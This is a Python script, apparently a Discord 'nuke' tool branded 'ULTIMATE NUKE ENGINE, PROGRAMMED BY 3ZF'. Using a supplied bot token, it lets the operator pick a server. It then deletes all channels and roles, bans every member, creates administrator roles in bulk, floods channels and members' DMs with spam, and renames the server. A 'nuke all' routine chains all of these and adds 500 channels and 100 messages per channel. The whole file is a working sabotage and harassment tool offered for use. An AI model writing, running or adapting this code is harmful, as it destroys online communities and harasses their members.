#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore, Style

init(autoreset=True)

RED = Fore.RED + Style.BRIGHT
RESET = Style.RESET_ALL

LOGO = f"""
{RED}
██████╗  ██████╗ ███████╗███████╗
╚════██╗██╔═████╗██╔════╝██╔════╝
 █████╔╝██║██╔██║███████╗███████╗
 ╚═══██╗████╔╝██║╚════██║╚════██║
██████╔╝╚██████╔╝███████║███████║
╚═════╝  ╚═════╝ ╚══════╝╚══════╝{RESET}
"""

BANNER = f"""
{RED}╔══════════════════════════════════════╗
{RED}║        ULTIMATE NUKE ENGINE        ║
{RED}║        PROGRAMMED BY 3ZF           ║
{RED}╚══════════════════════════════════════╝{RESET}
"""

def clear_screen():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except:
        pass

def show_banner(user=None):
    try:
        clear_screen()
        print(LOGO)
        print(BANNER)
        if user:
            print(f"{RED}[+] LOGGED IN AS: {user}{RESET}")
    except:
        pass

def main():
    try:
        show_banner()
        TOKEN = input(f"{RED}> ENTER TOKEN: {RESET}").strip()
        if not TOKEN:
            print(f"{RED}[-] TOKEN CANNOT BE EMPTY{RESET}")
            sys.exit(1)
        
        intents = discord.Intents.all()
        bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
        
        selected_guild = None
        running = True
        
        @bot.event
        async def on_ready():
            nonlocal selected_guild
            try:
                show_banner(bot.user.name)
                servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
                
                if not servers:
                    print(f"{RED}[-] NO SERVERS FOUND{RESET}")
                    await bot.close()
                    sys.exit(1)
                
                print(f"\n{RED}SERVERS ({len(servers)}):{RESET}")
                for i, s in enumerate(servers):
                    print(f"  {RED}{i+1}. {s.name[:20]:<20} (MEMBERS: {s.member_count}){RESET}")
                
                while True:
                    try:
                        idx = int(input(f"\n{RED}> CHOOSE SERVER NUMBER: {RESET}")) - 1
                        if 0 <= idx < len(servers):
                            selected_guild = servers[idx]
                            break
                        else:
                            print(f"{RED}[-] INVALID NUMBER{RESET}")
                    except ValueError:
                        print(f"{RED}[-] ENTER A NUMBER{RESET}")
                    except KeyboardInterrupt:
                        print(f"\n{RED}[-] EXITING...{RESET}")
                        await bot.close()
                        sys.exit(0)
                
                print(f"\n{RED}[+] TARGET: {selected_guild.name}{RESET}")
                await main_menu()
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
                await bot.close()
                sys.exit(1)
        
        async def main_menu():
            nonlocal running
            while running:
                try:
                    print(f"\n{RED}┌─────────────────────────────────────────────────────────────┐")
                    print(f"{RED}│ [1] DELETE CHANNELS   |   [2] DELETE ROLES     │")
                    print(f"{RED}│ [3] BAN MEMBERS       |   [4] CREATE CHANNELS  │")
                    print(f"{RED}│ [5] CREATE ROLES      |   [6] SPAM MESSAGES    │")
                    print(f"{RED}│ [7] CHANGE SERVER NAME|   [8] DM ALL MEMBERS   │")
                    print(f"{RED}│ [9] NUKE ALL         |   [0] EXIT              │")
                    print(f"{RED}└─────────────────────────────────────────────────────────────┘")
                    print(f"\n{RED}            PROGRAMMED BY 3ZF{RESET}")
                    
                    choice = input(f"\n{RED}> CHOOSE OPTION: {RESET}").strip()
                    
                    if choice == "1":
                        await delete_channels()
                    elif choice == "2":
                        await delete_roles()
                    elif choice == "3":
                        await ban_members()
                    elif choice == "4":
                        await create_channels()
                    elif choice == "5":
                        await create_roles()
                    elif choice == "6":
                        await spam_messages()
                    elif choice == "7":
                        await change_server_name()
                    elif choice == "8":
                        await dm_all_members()
                    elif choice == "9":
                        await nuke_all()
                    elif choice == "0":
                        running = False
                        print(f"\n{RED}[+] EXITING...{RESET}")
                        await bot.close()
                        sys.exit(0)
                    else:
                        print(f"{RED}[-] INVALID OPTION{RESET}")
                        await asyncio.sleep(0.1)
                except KeyboardInterrupt:
                    running = False
                    print(f"\n{RED}[+] EXITING...{RESET}")
                    await bot.close()
                    sys.exit(0)
                except Exception as e:
                    print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
                    await asyncio.sleep(0.1)
        
        async def delete_channels():
            try:
                print(f"\n{RED}[+] DELETING ALL CHANNELS...{RESET}")
                
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                channels = list(selected_guild.channels)
                if not channels:
                    print(f"{RED}[-] NO CHANNELS TO DELETE{RESET}")
                    return
                
                count = 0
                for ch in channels:
                    try:
                        await ch.delete()
                        count += 1
                        await asyncio.sleep(0.05)
                    except:
                        pass
                
                print(f"{RED}[+] {count} CHANNELS DELETED!{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def delete_roles():
            try:
                print(f"\n{RED}[+] DELETING ALL ROLES...{RESET}")
                
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                roles = [r for r in selected_guild.roles if r.name != "@everyone"]
                if not roles:
                    print(f"{RED}[-] NO ROLES TO DELETE{RESET}")
                    return
                
                count = 0
                for r in roles:
                    try:
                        await r.delete()
                        count += 1
                        await asyncio.sleep(0.05)
                    except:
                        pass
                
                print(f"{RED}[+] {count} ROLES DELETED!{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def ban_members():
            try:
                confirm = input(f"{RED}> BAN ALL MEMBERS? (YES/NO): {RESET}").lower()
                if confirm != "yes":
                    print(f"{RED}[-] CANCELLED{RESET}")
                    return
                
                print(f"\n{RED}[+] BANNING MEMBERS...{RESET}")
                
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
                if not members:
                    print(f"{RED}[-] NO MEMBERS TO BAN{RESET}")
                    return
                
                count = 0
                for m in members:
                    try:
                        await m.ban(reason="NUKE")
                        count += 1
                        await asyncio.sleep(0.05)
                    except:
                        pass
                
                print(f"{RED}[+] {count} MEMBERS BANNED!{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def create_channels():
            try:
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                try:
                    count = int(input(f"{RED}> HOW MANY CHANNELS?: {RESET}"))
                    if count <= 0:
                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
                        return
                except ValueError:
                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
                    return
                
                print(f"\n{RED}[+] ENTER 3 CHANNEL NAMES (PRESS ENTER AFTER EACH):{RESET}")
                names = []
                for i in range(3):
                    name = input(f"{RED}> NAME {i+1}: {RESET}").strip()
                    if name:
                        names.append(name)
                    else:
                        names.append(f"CHANNEL-{i+1}")
                
                print(f"\n{RED}[+] CREATING {count} CHANNELS...{RESET}")
                
                created = 0
                for i in range(count):
                    try:
                        name = names[i % 3]
                        await selected_guild.create_text_channel(name)
                        created += 1
                        await asyncio.sleep(0.05)
                    except:
                        pass
                
                print(f"{RED}[+] {created} CHANNELS CREATED!{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def create_roles():
            try:
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                try:
                    count = int(input(f"{RED}> HOW MANY ROLES?: {RESET}"))
                    if count <= 0:
                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
                        return
                except ValueError:
                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
                    return
                
                print(f"\n{RED}[+] ENTER 3 ROLE NAMES (PRESS ENTER AFTER EACH):{RESET}")
                names = []
                for i in range(3):
                    name = input(f"{RED}> NAME {i+1}: {RESET}").strip()
                    if name:
                        names.append(name)
                    else:
                        names.append(f"ROLE-{i+1}")
                
                print(f"\n{RED}[+] CREATING {count} ADMIN ROLES...{RESET}")
                
                created = 0
                for i in range(count):
                    try:
                        name = names[i % 3]
                        await selected_guild.create_role(
                            name=name,
                            color=discord.Color.from_rgb(139, 0, 0),
                            permissions=discord.Permissions(administrator=True)
                        )
                        created += 1
                        await asyncio.sleep(0.05)
                    except:
                        pass
                
                print(f"{RED}[+] {created} ADMIN ROLES CREATED!{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def spam_messages():
            try:
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                try:
                    count = int(input(f"{RED}> MESSAGES PER CHANNEL?: {RESET}"))
                    if count <= 0:
                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
                        return
                except ValueError:
                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
                    return
                
                msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
                if not msg:
                    print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
                    return
                
                text_channels = list(selected_guild.text_channels)
                if not text_channels:
                    print(f"{RED}[-] NO TEXT CHANNELS FOUND{RESET}")
                    return
                
                print(f"\n{RED}[+] SPAMMING {count} MESSAGES TO {len(text_channels)} CHANNELS...{RESET}")
                
                sent = 0
                for ch in text_channels:
                    for _ in range(count):
                        try:
                            await ch.send(msg)
                            sent += 1
                            await asyncio.sleep(0.05)
                        except:
                            pass
                
                print(f"{RED}[+] {sent} MESSAGES SENT!{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def change_server_name():
            try:
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                name = input(f"{RED}> NEW SERVER NAME: {RESET}")
                if not name:
                    print(f"{RED}[-] NAME CANNOT BE EMPTY{RESET}")
                    return
                
                try:
                    await selected_guild.edit(name=name)
                    print(f"{RED}[+] SERVER NAME CHANGED TO: {name}{RESET}")
                except Exception as e:
                    print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def dm_all_members():
            try:
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                try:
                    count = int(input(f"{RED}> HOW MANY MESSAGES PER MEMBER?: {RESET}"))
                    if count <= 0:
                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
                        return
                except ValueError:
                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
                    return
                
                msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
                if not msg:
                    print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
                    return
                
                members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
                if not members:
                    print(f"{RED}[-] NO MEMBERS TO DM{RESET}")
                    return
                
                print(f"\n{RED}[+] SENDING {count} DMS TO {len(members)} MEMBERS...{RESET}")
                
                sent = 0
                for member in members:
                    for _ in range(count):
                        try:
                            await member.send(msg)
                            sent += 1
                            await asyncio.sleep(0.05)
                        except:
                            pass
                
                print(f"{RED}[+] {sent} DMS SENT SUCCESSFULLY!{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        async def nuke_all():
            try:
                if not selected_guild:
                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
                    return
                
                confirm = input(f"{RED}> NUKE EVERYTHING? (YES/NO): {RESET}").lower()
                if confirm != "yes":
                    print(f"{RED}[-] CANCELLED{RESET}")
                    return
                
                print(f"\n{RED}[+] STARTING ULTIMATE NUKE...{RESET}")
                
                try:
                    channels = list(selected_guild.channels)
                    roles = [r for r in selected_guild.roles if r.name != "@everyone"]
                    members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
                    
                    deleted_channels = 0
                    for ch in channels:
                        try:
                            await ch.delete()
                            deleted_channels += 1
                            await asyncio.sleep(0.05)
                        except:
                            pass
                    
                    deleted_roles = 0
                    for r in roles:
                        try:
                            await r.delete()
                            deleted_roles += 1
                            await asyncio.sleep(0.05)
                        except:
                            pass
                    
                    banned_members = 0
                    for m in members:
                        try:
                            await m.ban(reason="ULTIMATE NUKE")
                            banned_members += 1
                            await asyncio.sleep(0.05)
                        except:
                            pass
                    
                    try:
                        await selected_guild.edit(name="NUKE BY 3ZF")
                    except:
                        pass
                    
                    created_channels = 0
                    for _ in range(500):
                        try:
                            await selected_guild.create_text_channel("NUKE-3ZF")
                            created_channels += 1
                            await asyncio.sleep(0.05)
                        except:
                            pass
                    
                    sent_messages = 0
                    for ch in selected_guild.text_channels:
                        for _ in range(100):
                            try:
                                await ch.send("NUKE BY 3ZF")
                                sent_messages += 1
                                await asyncio.sleep(0.05)
                            except:
                                pass
                    
                    print(f"{RED}[+] ULTIMATE NUKE COMPLETED!{RESET}")
                    print(f"{RED}[+] DELETED {deleted_channels} CHANNELS{RESET}")
                    print(f"{RED}[+] DELETED {deleted_roles} ROLES{RESET}")
                    print(f"{RED}[+] BANNED {banned_members} MEMBERS{RESET}")
                    print(f"{RED}[+] CREATED {created_channels} CHANNELS{RESET}")
                    print(f"{RED}[+] SENT {sent_messages} MESSAGES{RESET}")
                except Exception as e:
                    print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            except Exception as e:
                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            await asyncio.sleep(0.1)
        
        try:
            bot.run(TOKEN, reconnect=True)
        except discord.LoginFailure:
            print(f"{RED}[-] INVALID TOKEN{RESET}")
            sys.exit(1)
        except KeyboardInterrupt:
            print(f"\n{RED}[-] EXITING...{RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
            sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[-] EXITING...{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
